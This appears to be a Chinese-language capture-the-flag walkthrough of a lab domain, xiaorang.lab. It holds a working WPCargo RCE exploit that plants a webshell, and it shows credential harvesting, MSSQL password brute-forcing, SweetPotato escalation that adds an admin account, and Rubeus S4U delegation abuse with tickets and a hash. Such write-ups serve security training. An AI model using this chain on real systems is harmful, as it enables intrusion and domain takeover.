[proxychains] Strict chain  ...  43.134.9.57:1080  ...  172.22.2.18:80  ...  OK?
[proxychains] Strict chain  ...  43.134.9.57:1080  ...  172.22.2.18:80  ...  OK
[proxychains] Strict chain  ...  43.134.9.57:1080  ...  172.22.2.18:80  ...  OK
[proxychains] Strict chain  ...  43.134.9.57:1080  ...  172.22.2.18:80  ...  OK
[proxychains] Strict chain  ...  43.134.9.57:1080  ...  172.22.2.18:80  ...  OK
[proxychains] Strict chain  ...  43.134.9.57:1080  ...  172.22.2.18:80  ...  OK                                            > (16 / 137) 11.67%  ETA: 00:00:41
[proxychains] Strict chain  ...  43.134.9.57:1080  ...  172.22.2.18:80  ...  OK                                            > (36 / 137) 26.27%  ETA: 00:00:20
 Checking Config Backups - Time: 00:00:15 <==============================================================================> (137 / 137) 100.00% Time: 00:00:15

[i] No Config Backups Found.

[proxychains] Strict chain  ...  43.134.9.57:1080  ...  wpscan.com:443  ...  OK
[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[+] Finished: Thu Jul 31 13:25:35 2025
[+] Requests Done: 177
[+] Cached Requests: 5
[+] Data Sent: 44.034 KB
[+] Data Received: 275.101 KB
[+] Memory used: 253.801 MB
[+] Elapsed time: 00:00:4
```

扫出来插件有一个 rce 的洞 CVE-2021-25003

[WPCargo < 6.9.0 - Unauthenticated RCE](https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/)

POC 如下

```bash
import sys
import binascii
import requests

# This is a magic string that when treated as pixels and compressed using the png
# algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file
payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'

def encode_character_code(c: int):
    return '{:08b}'.format(c).replace('0', 'x')

text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]

destination_url = 'http://127.0.0.1:8001/'
cmd = 'ls'

# With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels.
requests.get(
    f"{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&sizefactor=.090909090909&size=1&filepath=/var/www/html/webshell.php"
)

# We have uploaded a webshell - now let's use it to execute a command.
print(requests.post(
    f"{destination_url}webshell.php?1=system", data={"2": cmd}
).content.decode('ascii', 'ignore'))

```

信息搜集一下，打一下

```bash
proxychains4 python3 WPCargo.py -t http://172.22.2.18/
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753939733915-5eeda905-1b04-4d4d-8fee-005ad4ca3d76.png)

成功攻击

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753939788386-bcc5b025-f61d-45d5-a151-c44a1eb15369.png)

一句话木马搞上

连上来

没有找到 flag 文件，去看看配置

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753941082151-ca891972-eb96-4f6b-9792-357dc2e90cc0.png)

有数据库内容

```bash
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'WpuserEha8Fgj9' );

/** Database hostname */
define( 'DB_HOST', '127.0.0.1' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

```

直接连上，发现内容

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753941526498-e8abff2a-56f4-4251-87b3-47ddcf19ad36.png)

同时还会发现有一个库是一个提示，看一下是一些个密码，直接导出

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753941643861-1eb2574b-56d6-4f96-a748-73ea5a9e1619.png)

刚才有个 MSSQL 的机子，我们直接去密码爆破一下

还真是把 Mssql 的密码给爆出来了

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753942332234-516de68a-a0ce-4015-8af9-0bab6f210b65.png)

```bash
sa: ElGNkOiC
```

使用 MDUT 这个工具

Mssq 连上来

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753941992180-32132adb-e584-487a-94f9-06317bf664c2.png)

可以执行命令

提权到 system![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753942537893-a890bde0-aae2-4b5f-8276-2c3dade15ff2.png)

存在 3389 ---RDP

我们直接利用权限搞一个高级别号

```bash
C:/Users/Public/SweetPotato.exe -a "netstat -ano"


C:/Users/Public/SweetPotato.exe -a "net user bx bx123456@ /add"
C:/Users/Public/SweetPotato.exe -a "net localgroup administrators bx /add"
```

也是连上远程桌面了

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753943054407-3afd9a25-def9-4366-b0dd-2e30b1301698.png)

我们拥有权限，获得 flag3

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753943101407-d3ad274a-cc97-4b59-9bd2-33009aa57268.png)





查看一下系统信息

是在这个xiaorang.lab 这个域内

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753943204905-2db3bad7-2090-4a66-9331-1e20e6466efd.png)

上传

猕猴🍑找到一个密码

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753943786707-8ac00572-3a1e-469d-82ed-2922f2246698.png)

提取关键信息

```bash
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket: 9f b9 58 a6 fa c0 41 ad 65 f0 90 ef e0 fb 09 de 45 dc 0c d1 b8 d2 42 4c df 48 f0 b6 f0 db d6 05 48 bb a1 e5 8e 29 f7 30 69 64 b7 9a ef da 31 32 3a db ec 43 f2 a9 4d 59 99 24 bf 2c 34 fd 97 f2 b1 98 07 40 af 7a b2 58 a9 13 11 92 27 75 83 d2 15 0c e7 a7 23 14 be 06 8c 42 10 2b 42 96 7e 28 7c b9 be 7a ee 43 e8 e7 e7 80 d9 8f fb 26 3b 05 07 fd 44 d0 d0 e6 49 f5 7f e5 1b 83 ab 29 a9 7a 19 34 e7 43 7d b7 19 28 47 4b 52 f0 4a 0d df c0 40 6e f7 52 ef 25 d3 d3 24 80 b9 37 1a df 45 59 a9 2f a7 7c 4e 88 5e b4 f1 df cf 37 17 a7 ba 83 54 fc e7 2d 88 1a 01 82 6e a0 3d cf 3f 09 77 31 2a 51 7b 3c f1 90 4a 17 4c ba 7e 6b 5e d4 40 5e 70 9f cd a9 ed c0 30 2c d9 3f 48 4a 25 97 43 f4 88 93 18 24 07 10 44 75 36 d5 c8 b0 db 27 03 7b

c8085de564eb895e033a912bda21adfd

Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:c8085de564eb895e033a912bda21adfd /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753944929075-8841b5b2-193e-4cbe-a2b9-3f950067d0b1.png)

```bash
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE14OZexNiH84UPYzK3l/RBuQHnwD3SNsV5Bk+RBHV+k2U8MBOU5fkbxSDZEQsuU36SzpjHCeJt8bMBmaBsw/tg68qD46YRBbFDEZg/w+Zxpf8zBc3fj0JKLQYVFEJcM284fp4Z+UPhTr9+GysJeiVAey63ym4XwePbqprP+bPAogzX6DMP+0m8kyiGiQ05Q5fRDTSlf6m9+THlbvTGwHxhclCDVWVgn0f4AtQIySel5DXJgH1TVKWkRVm9l4lUR5YJO1sTQBK0a6rLTr7pMHt8VYOZ/TinUNlBEvdgKwgexMD1Il472KqYFEWzZRm71fTXfUjRjF+EnuQ5d7f8e8VnH8vaRONgrI1/DoZ9rgbdybepPl2NZo/sosMgDkN6dg1NA1v+LdhNUxv/CPuJwZQLWhGLmrAT0xAckfHI5SgWvf7QDp0oEr/lvLJOLdhrrLuNdnb5tKW13Eqsa90fDm5NfuC+Fkp1Gl0xMvjlR7Lkm959N/W/osOtzLWrpREM3r0U8eOxg9uJZ8HUQPwHYVwRzGzPJLK1avesHbTotEYbh9mJ/Uv5lUrd/AT+UKknFXZhNG+bGxVgztHa62V+jX3tKNsXaj7kaGxE384cd5NUwVyJ4/sSKHUJfkhSZevBaX4KKlUtgUHWA51pR5avKHPuya+MKRJ5XYRzF0W49zHtOst49GvCgmnUyA5sUmCAqbQxZ/aiBPPgK+iBtm65gq4rEYcjw0tlxQ6Lne7krocbXeooS1xGZKFbBpDNOqvuAWtffHO6gsFJ6RoxlxM4KTszfyfJT0TCM2BbCDeiuZDQ/NRl81RDbxc/j6OGvrwJZeDcBULnzPwcmuwi6isAK8Ih8iiw02NlDgYxIetqVBdQiyS28QdeO0fW+egdSDy91YRGhDZng/BJtlACnXmoA/oOmH0i49nSPw5BSTsH5ObpMLoxBI3E2tfChCereefEjdV+wsRfahFxLPbqatFk4APQZStKU9BO5vzhqWtMbEaQutYxXpfAvFKsSCwzmBiJ1vgzyjCvBxPFY2HzfeKrQOWctIhaF1maEdKOk16hFqkN7dMzZm7lqODH52mpuIYRLP5ljGTKmzDUD6w4Iz4qi9UiNDPJeQg3ANVF6OoxRZT845Vl7A0yHUax6mGdnBg+kbkU75YWbKvnOZtvsSZIRVor+TkIWGVAoF3lPnOD+O8E6T79S/1G9iTQh1zg4wOJAku2TXRtOpRJ4pf/OkxO88qqHOngWJHq8Rd271S5BCSZ8mscKHGnhIVqPwDm0+y8NPewKer7iT45Yr6RYzhUHD4oPdQbE1hUvB6Cd31kU2QZ6XBbOsP+gbBfQQBkI2bhkb8qWTdATwFbbkJaUDZP5mPmJYCSFqA+i423AM0HyABmeovrIl97TnI3Qivdmj7dBvxQLJz8vx2HQEuN6K2LIixHgOWF4yxM4XjRRdIgZe37GdtQfwLKZmDqyitGZqJWjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBA4125kZTXjYeyjL1TxBjQroQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDczMTA2NTUwOFqmERgPMjAyNTA3MzExNjU1MDhapxEYDzIwMjUwODA3MDY1NTA4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==

```

输出结果如下

```bash
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'MSSQLSERVER$@XIAORANG.LAB'
[*] Using domain controller: DC.xiaorang.lab (172.22.2.3)
[*] Sending S4U2self request to 172.22.2.3:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'MSSQLSERVER$@XIAORANG.LAB'
[*] base64(ticket.kirbi):

      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
      VkVSJA==

[*] Impersonating user 'Administrator' to target SPN 'CIFS/DC.xiaorang.lab'
[*] Building S4U2proxy request for service: 'CIFS/DC.xiaorang.lab'
[*] Using domain controller: DC.xiaorang.lab (172.22.2.3)
[*] Sending S4U2proxy request to domain controller 172.22.2.3:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/DC.xiaorang.lab':

      doIGhjCCBoKgAwIBBaEDAgEWooIFlTCCBZFhggWNMIIFiaADAgEFoQ4bDFhJQU9SQU5HLkxBQqIiMCCg
      AwIBAqEZMBcbBENJRlMbD0RDLnhpYW9yYW5nLmxhYqOCBUwwggVIoAMCARKhAwIBBKKCBToEggU25Krd
      p7ThNkBBbWy85RneVzJAmH2DWkvy7w/icZVaPsiFKlwTts7Leu4vipGJnjwmhDuwVrVcPO/zoE9suUSc
      +KIXWSMYTKDYdDbfdmJFWAbi1mGNG1TnrZpLR+foXXTvATtVFqT+1VwEfEr+XBDqUM2kAuDzsv4UkKXS
      ACJXSAwkph8gJgIOWhiC/ObbgKdz4eUrb9KivVIPPxErYTr5DXrv7uFybpCVctVd6ocbm+kwiPrjG9SQ
      A1HcsriJtUb63EvGi9IGZS5IPF2se/bL2KnqfBfnJ1xHk2Ph/V/ZhnRXj5R9dNd22Q7/M123uPwaRiCW
      imInTVf5vFQYZWWQ9L6twXu/4GzTB5iqobCZoN5HX+lR/3CAO/NjzaOa+bpOnzZFfFKdvjsd+MBd7E9G
      HAOlAJvfOx2bE6E88zhhQi9CrVMCii6v69CM7MrxZUGucVbY6p50r85jNZdIn3h+/hGRbwbLbpeZFS7s
      FJFLTJgHbbDDZc7niH27O4JRTA2a3bY1F5zSoSY6BnH6ieg1KI1HtNNnqmf1/MKVyRGTcGw/Xb3+UXS5
      1eOU7VV9kyzDNdOz7LTQ3Fxeb01y6O5pIeMmC99D6zkXeDWebBHpXsk/o8u8xl8AgnG2zZR5F6XngeTZ
      nLeHjUmxusgcqSPkXQY6ETD7rVd7BWex2MBeVUUj6ksvgDqBt2nJ+6oSRKqEk43405maOG5sCa2JmOuy
      jroTCxtkOSXDnA8RUCYtPMlXCe97reSUbwGlV0mD9zqtda9ps16OnUpgtjjHi6rHVPCcZwuZYeUorJ2p
      gVEOIS733qBuGotfYrpgOiAqSOS7izg1V3aJIJIsak73n6VSWNXt37FHZT9QwTGjbJpAV5oeEHfaFpgH
      E7u75YGIrGUtzvJ4xy8BdNv6rD+UxQ58/4guZy0fnRGbt7+rfvBr0HBtoiyAraWkia1sIp7PBN0OeJ6Y
      yyRacAb7AHW+YkxaYa0+Es0f+ozqnsWqzV1IM8mmGJcO6T0y9pBnt+OYZPBUoglSsi7czPJPsd5WVINq
      9cOZrtY6z5wx+mrwtDwhLl7rrtzjpfA/oItnJ6AaPugMjs0qHLi5NStANLprYEhFA2G8EMGPHBxZ74VD
      DiF3neIh66H4/B83SbdsuLtPXRPHMvOwXjs7JqzZp3XBP2XgAg+Gm7rHSUova684P4vjsEab21VrK3cY
      s03Asb9ACWX4ZFlhOjIIyc/oejwZElRsbVAWd/jjjuHfLsZrUTJBr6DvTPHPXOEKZdjYfWXmc0aGIAzz
      e4nEpUnOgZXRlvDhn21DCCVvPufL4GhuZyrBkp7X1nzkuvYOq6yu/NZXv42I+tPUyirdxVrL8Tm5HS/4
      mDImttlqY68ZszJv4MbQEHE+K8zVTh6i6czQ7bHNiQD82c8JSL00QqKmzZh7R4Ci5cInkfSNEwdsIQp/
      Nvda+qg0y+wep345wRmxkYHXpzsPx5zGcHIqwcUBilQ5ps4wVptzbbmrTMjlSDoKUF4OOtccJbTmpHa6
      GdcvXmOA4i0pixJJDkVyqNRYrcxFU1TbqRb2OCGUgHL/wcjR765RJ667KHAGuZS3LUtOqXfRO8MI4hVC
      HcHn3uqJFj575Yhp32l0fyqvnKzycIFnEGUgZdkVtQ+2W/9baBSBczSoNvq7ti6DzSfH+C4DmuQjCiYd
      dKnnUyEV/N7fcPwaFdDRJRucuC5fmC+xEF/RVAZw+etrgl7alTKfVPxx6VaTYvFHTUqnfd1DqFYtfSFi
      XDrDc8k5l50d9HqjgdwwgdmgAwIBAKKB0QSBzn2ByzCByKCBxTCBwjCBv6AbMBmgAwIBEaESBBA8GkBe
      ipS5n7tpNNdauCD4oQ4bDFhJQU9SQU5HLkxBQqIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMF
      AEClAAClERgPMjAyNTA3MzEwNjU2MjBaphEYDzIwMjUwNzMxMTY1NTA4WqcRGA8yMDI1MDgwNzA2NTUw
      OFqoDhsMWElBT1JBTkcuTEFCqSIwIKADAgECoRkwFxsEQ0lGUxsPREMueGlhb3JhbmcubGFi
[+] Ticket successfully imported!
```

读取域内账户对应 flag

```bash
type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753945045104-0804e547-c7e9-483a-8059-818537d16726.png)

最后域渗透拿下 flag



![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753945084512-2b479f92-3310-48f7-868a-627cc577ef93.png)

